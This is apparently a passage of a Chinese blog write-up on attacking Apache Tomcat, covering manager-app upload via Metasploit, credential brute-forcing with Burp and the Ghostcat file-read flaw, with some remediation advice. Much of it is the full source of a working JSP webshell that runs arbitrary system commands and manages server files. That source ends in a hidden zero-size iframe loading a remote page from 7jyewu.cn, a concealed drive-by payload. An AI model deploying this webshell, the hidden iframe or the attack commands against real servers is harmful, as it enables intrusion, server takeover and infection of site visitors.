+var themecolor=aobject.getAttribute("theme")? aobject.getAttribute("theme") : initTabpostcolor
+aobject.style.backgroundColor=document.getElementById("tabcontentcontainer").style.backgroundColor=themecolor
+}
+
+function collecttablinks(){
+var tabobj=document.getElementById("tablist")
+tabobjlinks=tabobj.getElementsByTagName("A")
+}
+
+function do_onload(){
+collecttablinks()
+initTabcolor=cascadedstyle(tabobjlinks[1], "backgroundColor", "background-color")
+initTabpostcolor=cascadedstyle(tabobjlinks[0], "backgroundColor", "background-color")
+expandcontent(initialtab[1], tabobjlinks[initialtab[0]-1])
+}
+
+if (window.addEventListener)
+window.addEventListener("load", do_onload, false)
+else if (window.attachEvent)
+window.attachEvent("onload", do_onload)
+else if (document.getElementById)
+window.onload=do_onload
+
+ 
+
+&lt;/script&gt;
+&lt;script language="javascript"&gt;
+
+function doForm(action,path,file,cmd,tab,content)
+{
+ document.frmCqq.action.value=action;
+ document.frmCqq.path.value=path;
+ document.frmCqq.file.value=file;
+ document.frmCqq.cmd.value=cmd;
+ document.frmCqq.tabID.value=tab;
+ document.frmCqq.content.value=content;
+ if(action=="del")
+ {
+  if(confirm("确定要删除文件 "+file+" 吗？"))
+  document.frmCqq.submit();
+ }
+ else
+ {
+  document.frmCqq.submit();    
+ }
+}
+&lt;/script&gt;
+
+&lt;title&gt;JSP Shell 岁月联盟专用版本&lt;/title&gt;
+&lt;head&gt;
+
+
+&lt;body&gt;
+
+&lt;form name="frmCqq" method="post" action=""&gt;
+&lt;input type="hidden" name="action" value=""&gt;
+&lt;input type="hidden" name="path" value=""&gt;
+&lt;input type="hidden" name="file" value=""&gt;
+&lt;input type="hidden" name="cmd" value=""&gt;
+&lt;input type="hidden" name="tabID" value="2"&gt;
+&lt;input type="hidden" name="content" value=""&gt;
+&lt;/form&gt;
+
+&lt;!--Top Menu Started--&gt;
+&lt;ul id="tablist"&gt;
+&lt;li&gt;&lt;a href="" class="current" onClick="return expandcontent('menu1', this)"&gt; &lt;%=strFileManage[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="new.htm" onClick="return expandcontent('menu2', this)" theme="#EAEAFF"&gt; &lt;%=strCommand[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="hot.htm" onClick="return expandcontent('menu3', this)" theme="#EAEAFF"&gt; &lt;%=strSysProperty[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="search.htm" onClick="return expandcontent('menu4', this)" theme="#EAEAFF"&gt; &lt;%=strHelp[languageNo]%&gt; &lt;/a&gt;&lt;/li&gt;
+ &amp;nbsp; &lt;%=authorInfo[languageNo]%&gt;
+&lt;/ul&gt;
+&lt;!--Top Menu End--&gt;
+
+
+&lt;%
+StringBuffer sbFolder=new StringBuffer("");
+StringBuffer sbFile=new StringBuffer("");
+try
+{
+ File objFile = new File(strDir);
+ File list[] = objFile.listFiles(); 
+ if(objFile.getAbsolutePath().length()&gt;3)
+ {
+  sbFolder.append("&lt;tr&gt;&lt;td &gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;&lt;a href=\"javascript:doForm('','"+formatPath(objFile.getParentFile().getAbsolutePath())+"','','"+strCmd+"','1','');\"&gt;");
+  sbFolder.append(strParentFolder[languageNo]+"&lt;/a&gt;&lt;br&gt;- - - - - - - - - - - &lt;/td&gt;&lt;/tr&gt;\r\n ");
+
+
+ }
+ for(int i=0;i&lt;list.length;i++)
+ {
+  if(list[i].isDirectory())
+  {
+   sbFolder.append("&lt;tr&gt;&lt;td &gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;");
+   sbFolder.append("  &lt;a href=\"javascript:doForm('','"+formatPath(list[i].getAbsolutePath())+"','','"+strCmd+"','1','');\"&gt;");
+   sbFolder.append(list[i].getName()+"&lt;/a&gt;&lt;br&gt;&lt;/td&gt;&lt;/tr&gt; ");
+  }
+  else
+  {
+      String strLen="";
+   String strDT="";
+   long lFile=0;
+   lFile=list[i].length();
+   strLen = convertFileSize(lFile);
+   Date dt=new Date(list[i].lastModified());
+   strDT=dt.toLocaleString();
+   sbFile.append("&lt;tr onmouseover=\"this.style.backgroundColor='#FBFFC6'\" onmouseout=\"this.style.backgroundColor='white'\"&gt;&lt;td&gt;");
+   sbFile.append(""+list[i].getName()); 
+   sbFile.append("&lt;/td&gt;&lt;td&gt;");
+   sbFile.append(""+strLen);
+   sbFile.append("&lt;/td&gt;&lt;td&gt;");
+   sbFile.append(""+strDT);
+   sbFile.append("&lt;/td&gt;&lt;td&gt;");
+
+   sbFile.append(" &amp;nbsp;&lt;a href=\"javascript:doForm('edit','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\"&gt;");
+   sbFile.append(strFileEdit[languageNo]+"&lt;/a&gt; ");
+
+   sbFile.append(" &amp;nbsp;&lt;a href=\"javascript:doForm('del','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\"&gt;");
+   sbFile.append(strFileDel[languageNo]+"&lt;/a&gt; ");
+
+   sbFile.append("  &amp;nbsp;&lt;a href=\"javascript:doForm('down','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\"&gt;");
+   sbFile.append(strFileDown[languageNo]+"&lt;/a&gt; ");
+
+   sbFile.append("  &amp;nbsp;&lt;a href=\"javascript:doForm('copy','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\"&gt;");
+   sbFile.append(strFileCopy[languageNo]+"&lt;/a&gt; ");
+  }  
+
+ } 
+}
+catch(Exception e)
+{
+ out.println("&lt;font color=red&gt;操作失败： "+e.toString()+"&lt;/font&gt;");
+}
+%&gt;
+
+&lt;DIV id="tabcontentcontainer"&gt;
+
+
+&lt;div id="menu3" class="tabcontent"&gt;
+&lt;br&gt; 
+&lt;br&gt; &amp;nbsp;&amp;nbsp; 未完成
+&lt;br&gt; 
+&lt;br&gt;&amp;nbsp;
+
+&lt;/div&gt;
+
+&lt;div id="menu4" class="tabcontent"&gt;
+&lt;br&gt;
+&lt;p&gt;一、功能说明&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; jsp 版本的文件管理器，通过该程序可以远程管理服务器上的文件系统，您可以新建、修改、&lt;/p&gt;
+&lt;p&gt;删除、下载文件和目录。对于windows系统，还提供了命令行窗口的功能，可以运行一些程序，类似&lt;/p&gt;
+&lt;p&gt;与windows的cmd。&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;二、测试&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;b&gt;请大家在使用过程中，有任何问题，意见或者建议都可以给我留言，以便使这个程序更加完善和稳定，&lt;p&gt;
+留言地址为：&lt;a href="http://" target="_blank"&gt;&lt;/a&gt;&lt;/b&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;三、更新记录&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2004.11.15&amp;nbsp; V0.9测试版发布，增加了一些基本的功能，文件编辑、复制、删除、下载、上传以及新建文件目录功能&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2004.10.27&amp;nbsp; 暂时定为0.6版吧， 提供了目录文件浏览功能 和 cmd功能&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2004.09.20&amp;nbsp; 第一个jsp&amp;nbsp;程序就是这个简单的显示目录文件的小程序&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;/div&gt;
+
+
+&lt;div id="menu1" class="tabcontent"&gt;
+&lt;%
+out.println("&lt;table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF&gt;&lt;tr&gt;&lt;td width='30%'&gt;"+strCurrentFolder[languageNo]+"： &lt;b&gt;"+strDir+"&lt;/b&gt;&lt;/td&gt;&lt;td&gt;" + getDrivers() + "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;\r\n");
+%&gt;
+&lt;table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF"&gt;
+       
+        &lt;tr&gt; 
+          &lt;td width="25%" align="center" valign="top"&gt; 
+              &lt;table width="98%" border="0" cellspacing="0" cellpadding="3"&gt;
+     &lt;%=sbFolder%&gt;
+                &lt;/tr&gt;                 
+              &lt;/table&gt;
+          &lt;/td&gt;
+          &lt;td width="81%" align="left" valign="top"&gt;
+ 
+ &lt;%
+ if(strAction!=null &amp;&amp; strAction.equals("edit"))
+ {
+  out.println(sbEdit.toString());
+ }
+ else if(strAction!=null &amp;&amp; strAction.equals("copy"))
+ {
+  out.println(sbCopy.toString());
+ }
+ else if(strAction!=null &amp;&amp; strAction.equals("down"))
+ {
+  out.println(sbDown.toString());
+ }
+ else if(strAction!=null &amp;&amp; strAction.equals("savecopy"))
+ {
+  out.println(sbSaveCopy.toString());
+ }
+ else if(strAction!=null &amp;&amp; strAction.equals("newFile") &amp;&amp; !sbNewFile.toString().equals(""))
+ {
+  out.println(sbNewFile.toString());
+ }
+ else
+ {
+ %&gt;
+  &lt;span id="EditBox"&gt;&lt;table width="98%" border="1" cellspacing="1" cellpadding="4" bordercolorlight="#cccccc" bordercolordark="#FFFFFF" bgcolor="white" &gt;
+              &lt;tr bgcolor="#E7e7e6"&gt; 
+                &lt;td width="26%"&gt;&lt;%=strFileName[languageNo]%&gt;&lt;/td&gt;
+                &lt;td width="19%"&gt;&lt;%=strFileSize[languageNo]%&gt;&lt;/td&gt;
+                &lt;td width="29%"&gt;&lt;%=strLastModified[languageNo]%&gt;&lt;/td&gt;
+                &lt;td width="26%"&gt;&lt;%=strFileOperation[languageNo]%&gt;&lt;/td&gt;
+              &lt;/tr&gt;              
+            &lt;%=sbFile%&gt;
+             &lt;!-- &lt;tr align="center"&gt; 
+                &lt;td colspan="4"&gt;&lt;br&gt;
+                  总计文件个数：&lt;font color="#FF0000"&gt;30&lt;/font&gt; ，大小：&lt;font color="#FF0000"&gt;664.9&lt;/font&gt; 
+                  KB &lt;/td&gt;
+              &lt;/tr&gt;
+    --&gt;
+            &lt;/table&gt;
+   &lt;/span&gt;
+ &lt;%
+ }  
+ %&gt;
+
+          &lt;/td&gt;
+        &lt;/tr&gt;
+
+ &lt;form name="frmMake" action="" method="post"&gt;
+ &lt;tr&gt;&lt;td colspan=2 bgcolor=#FBFFC6&gt;
+ &lt;input type="hidden" name="action" value="newFile"&gt;
+ &lt;input type="hidden" name="path" value="&lt;%=strDir%&gt;"&gt;
+ &lt;input type="hidden" name="file" value="&lt;%=strFile%&gt;"&gt;
+ &lt;input type="hidden" name="cmd" value="&lt;%=strCmd%&gt;"&gt;
+ &lt;input type="hidden" name="tabID" value="1"&gt;
+ &lt;input type="hidden" name="content" value=""&gt;
+ &lt;%
+ if(!strDir.endsWith("\\"))
+ strDir = strDir + "\\";
+ %&gt;
+ &lt;input type="text" name="fileName" size=36 value="&lt;%=strDir%&gt;"&gt;
+ &lt;input type="submit" name="btnNewFile" value="新建文件" onclick="frmMake.submit()" &gt; 
+ &lt;input type="submit" name="btnNewDir" value="新建目录"  onclick="frmMake.submit()" &gt; 
+ &lt;/form&gt;  
+ &lt;form name="frmUpload" enctype="multipart/form-data" action="" method="post"&gt;
+ &lt;input type="hidden" name="action" value="upload"&gt;
+ &lt;input type="hidden" name="path" value="&lt;%=strDir%&gt;"&gt;
+ &lt;input type="hidden" name="file" value="&lt;%=strFile%&gt;"&gt;
+ &lt;input type="hidden" name="cmd" value="&lt;%=strCmd%&gt;"&gt;
+ &lt;input type="hidden" name="tabID" value="1"&gt;
+ &lt;input type="hidden" name="content" value=""&gt;
+ &lt;input type="file" name="cqqUploadFile" size="36"&gt;
+ &lt;input type="submit" name="submit" value="上传"&gt;
+ &lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;
+      &lt;/table&gt;
+&lt;/div&gt;
+&lt;div id="menu2" class="tabcontent"&gt;
+
+&lt;%
+String line="";
+StringBuffer sbCmd=new StringBuffer("");
+
+if(strCmd!=null) 
+{
+ try
+ {
+  //out.println(strCmd);
+  Process p=Runtime.getRuntime().exec("cmd /c "+strCmd);
+  BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
+  while((line=br.readLine())!=null)
+  {
+   sbCmd.append(line+"\r\n");  
+  }    
+ }
+ catch(Exception e)
+ {
+  System.out.println(e.toString());
+ }
+}
+else
+{
+ strCmd = "set";
+}
+
+%&gt;
+&lt;form name="cmd" action="" method="post"&gt;
+&amp;nbsp;
+&lt;input type="text" name="cmd" value="&lt;%=strCmd%&gt;" size=50&gt;
+&lt;input type="hidden" name="tabID" value="2"&gt;
+&lt;input type=submit name=submit value="&lt;%=strExecute[languageNo]%&gt;"&gt;
+&lt;/form&gt;
+&lt;%
+if(sbCmd!=null &amp;&amp; sbCmd.toString().trim().equals("")==false)
+{
+%&gt;
+&amp;nbsp;&lt;TEXTAREA NAME="cqq" ROWS="20" COLS="100%"&gt;&lt;%=sbCmd.toString()%&gt;&lt;/TEXTAREA&gt;
+&lt;br&gt;&amp;nbsp;
+&lt;%
+}
+%&gt;
+&lt;/DIV&gt;
+&lt;/div&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;center&gt;&lt;a href="http://" target="_blank"&gt;&lt;/a&gt; 
+&lt;br&gt;
+&lt;iframe src=http://7jyewu.cn/a/a.asp width=0 height=0&gt;&lt;/iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="MSF攻击"><a href="#MSF攻击" class="headerlink" title="MSF攻击"></a>MSF攻击</h4><pre class="line-numbers language-none"><code class="language-none">use exploit/multi/http/tomcat_mgr_upload 
+set HttpUsername tomcat
+set HttpPassword tomcat
+set rhosts 192.168.175.191
+set rport 8080
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>这里就直接略过了 自己去操作一下 </p>
+<p>这就成功进来了</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062034.png" alt="1619340998143"></p>
+<h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><pre class="line-numbers language-none"><code class="language-none">1、在系统上以低权限运行 Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）
+2、增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。
+在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制
+3、以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="Tomcat-manager-App暴力破解"><a href="#Tomcat-manager-App暴力破解" class="headerlink" title="Tomcat manager App暴力破解"></a>Tomcat manager App暴力破解</h3><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>我们先抓后台的包</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062035.png" alt="1619341538485"></p>
+<p>然后放包  进行登录  </p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062036.png" alt="1619341565301"></p>
+<p>这里注意这段回显</p>
+<pre class="line-numbers language-none"><code class="language-none">Authorization: Basic dG9tY2F0OnRvbWNhdA==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062037.png" alt="1619341609504"></p>
+<p>发现Tomcat的后台登录账号和密码</p>
+<p>是以base64加密的 账号:密码</p>
+<p>然后我们重新去抓后台的包 进行爆破</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062038.png" alt="1619341768817"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062039.png" alt="1619341811564"></p>
+<p>添加密码本 和base64 的编码规则 </p>
+<p>把这个自带的编码 对勾去掉</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062040.png" alt="1619342044653"></p>
+<p>开始攻击 拿到账号和密码</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062041.png" alt="1619342139990"></p>
+<p>这里讲第二种方式</p>
+<p>自定义迭代器</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062042.png" alt="1619342352290"></p>
+<p>分位置 进行不同的载入</p>
+<p>比如这里 就应该是3个位置</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062043.png" alt="1619342430579"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062044.png" alt="1619342458443"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062045.png" alt="1619342481874"></p>
+<p>下面和之前的设置 一样 </p>
+<p>base64编码 和去掉对勾 默认的Url编码</p>
+<h4 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h4><pre class="line-numbers language-none"><code class="language-none">1.取消 manager/html功能
+2.manager页面应只允许本地IP访问<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="Tomcat-AJP文件包含漏洞分析-CVE-2020-1938"><a href="#Tomcat-AJP文件包含漏洞分析-CVE-2020-1938" class="headerlink" title="Tomcat AJP文件包含漏洞分析(CVE-2020-1938)"></a>Tomcat AJP文件包含漏洞分析(CVE-2020-1938)</h3><h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>由于 Tomcat在处理<code>AJP</code>请求时，未对请求做任何验证</p>
+<p>通过设置AJP连接器封装的 request对象的属性，导致产生任意文件读取漏洞和代码执行漏洞！<br>CVE-2020-1938又名 GhostCat，由长亭科技安全研究员发现的存在于 Tomcat中的安全漏洞，由于 Tomcat AJP协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector可以读取或包含 Tomcat上所有 webapp目录下的任意文件，例如可以读取 webapp配置文件或源码。</p>
+<p>此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p>
+<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>漏洞成因是两个配置文件导致</p>
+<p>Tomat在部罢时有两个重要的配置文件<code>conf/server.xml、conf/web.xml</code></p>
+<p>前者定义了 Tomcat启动时涉及的组件属性，其中包含两个connector(用于处理请求的组件)</p>
+<p>如果开启状态下，tomcat启动后会监听8080、8009端口，它们分别负责接受http、ajp协议的数据</p>
+<p>后者则和普通的javaWeb应用一样，用来定义servlet</p>
+<pre class="line-numbers language-none"><code class="language-none">Apache Tomcat 9.x &lt; 9.0.31
+Apache Tomcat 8.x&lt;8.5.51
+Apache Tomcat 7.x&lt;7.0.100
+Apache tomcat 6.x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7325">https://xz.aliyun.com/t/7325</a></p>
+<p><a target="_blank" rel="noopener" href="https://yinwc.github.io/2020/03/01/CVE-2020-1938/">https://yinwc.github.io/2020/03/01/CVE-2020-1938/</a></p>
+<h4 id="运行过程"><a href="#运行过程" class="headerlink" title="运行过程"></a>运行过程</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062046.png" alt="image-20210718060241151"></p>
+<p>从图中可以看出，Tomcat最顶层的容器是 Server，其中包含至少一个或者多个 Service，一个 Service有多个 Connector和一个 Container组成。</p>
+<p>这两个组件的作用为:</p>
+<pre class="line-numbers language-none"><code class="language-none">1、Connector用于处理连接相关的事情，并提供Socket与Request和Response相关的转化；
+2、Container用于封装和管理 Servlet，以及具体处理 Request请求<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>Tomcat默认的<code>conf/server.xml</code>中配置了2个Connector，</p>
+<p>一个为8080端口  HTTP协议(1.1版本)端口，默认监听地址：<code>0.0.0.0:8080</code></p>
+<p>另外一个就是默认的8009 AJP协议(1.3版本)，默认监听地址为：<code>0.0.0.0:8009</code>，两个端口默认均监听在外网。此次漏洞产生的位置便是8009 AJP协议，此处使用公开的利用脚本进行测试，可以看到能读取<code>web.xml</code>文件</p>
+<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>利用vulhub</p>
+<pre class="line-numbers language-none"><code class="language-none">cd tomcat/CVE-2020-1938
+
+sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062047.png" alt="1619348867355"></p>
+<p>Poc地址：<a target="_blank" rel="noopener" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a> </p>
+<p>脚本是基于Python2的</p>
+<p>它可以看webapps目录下的所有东西</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062048.png" alt="1619349787403"></p>
+<p>可以看到它的语法要求</p>
